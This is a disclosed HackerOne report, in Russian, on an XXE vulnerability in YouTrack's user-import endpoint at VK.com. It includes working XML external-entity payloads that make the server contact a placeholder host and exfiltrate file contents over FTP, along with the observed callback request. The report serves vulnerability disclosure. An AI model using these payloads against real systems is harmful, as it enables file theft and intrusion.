# Внедрение внешних сущностей в функционале импорта пользователей YouTrack

### VULNERABILITY INFORMATION

Уязвимость существует из-за возможности использования внешних сущностей XML разметки в функционале импорта пользователей YouTrack. Веб-приложение доступно по адресу youtrack.vk-cdn.net
Исходя из документации (https://confluence.jetbrains.com/display/YTD6/Import+Users) поддерживает импорт данных методом PUT в формате XML.
Стандарт XML-документа поддерживает включение секции DTD, а секции DTD, в свою очередь могут подключать к документу дополнительные компоненты, так называемые внешние сущности. Внешние сущности являются отдельными файлами и задаются с помощью ключевого слова SYSTEM и URI. Если XML-парсер невалидирующий, он может просто загрузить внешнюю сущность и подключить к содержимому XML-документа.
Злоумышленник может подставить в URI внешней сущности file URI, указывающий на аппаратное устройство ЭВМ, или на локальный файл в системе. Сервер попытается прочитать файл по указанному URI и включить его содержимое в XML. 
Минимальный запрос будет выглядить следующим образом:
```
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<list>
  <user login="lenin" fullName="Ulyanov Vladimir Ilyich" email="lenin@mavzoley.su"/>
</list>
```
Но для добавления пользователя необходимо иметь учетную запись и быть администратором системы.
Однако, внедрив внешнюю сущность, XML-данные пройдут валидацию, и запрос будет выполнен, несмотря на предупреждение об отсутствии аутентификации. Пример XML-запроса представлен ниже:
```
<?xml version="1.0"?>
<!DOCTYPE list [
<!ENTITY % xxe SYSTEM "http://myserver/xxe-test">
%xxe;
]>
<list></list>
```

В этом случае, сервер получит GET-запрос
```
GET /xxe-test HTTP/1.1
HOST: myserver
USER_AGENT: Java/1.8.0_45
ACCEPT: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
CONNECTION: keep-alive
```
Источник запроса:
```
IP: 87.240.169.26
HOSTNAME: srv26-169-240-87.vk.com
```
что свидетельствует уязвимости.

Внедрив вместо `http://myserver/xxe-test` собственную секцию DTD, с подобным содержимым
```
<!ENTITY % c "<!ENTITY &#37; rrr SYSTEM 'ftp://myhost:1935/%b;'>">%c;
```
мы получим возможность отправлять содержимое файлов с помощью протокола FTP
(исследование компании OnSec http://lab.onsec.ru/2014/06/xxe-oob-exploitation-at-java-17.html)
Так как веб-приложение работает на языке Java (о чем говорит заголовок user-agent), мы так же можем получать содержимое директорий  из-за особенностей работы Java.

При использовании такого механизма возможны такие виды атак, как например, как отказ в обслуживании (DoS) как сам сервер, так и другие системы, чтение произвольных файлов, сканирование TCP-портов (даже в обход фаервола), кража материалов NTLM-аутентификации, инициированная через UNC-обращение к системе, находящейся под контролем злоумышленника и т.п.

Эксплуатация в целях демонстрации доступна по следующей ссылке: https://youtu.be/0gMTwPU-BQc

Данная уязвимость имеет статус 0day, разработчики продукта YouTrack (компания Jetbrains) получит соответствующие уведомления.

---

| Field | Value |
|-------|-------|
| **Report ID** | #114476 |
| **Title** | Внедрение внешних сущностей в функционале импорта пользователей YouTrack |
| **URL** | https://hackerone.com/reports/114476 |
| **State** | Resolved |
| **Severity** | ? (?) |
| **Weakness** | Command Injection - Generic |
| **Program** | VK.com |
| **Reporter** | bo0om |
| **Submitted** | February 3, 2016, 6:49PM UTC |
| **Disclosed** | March 18, 2016, 1:13PM UTC |
| **Visibility** | full |
| **Bounty** | None |

--- *Downloaded from https://hackerone.com/reports/114476*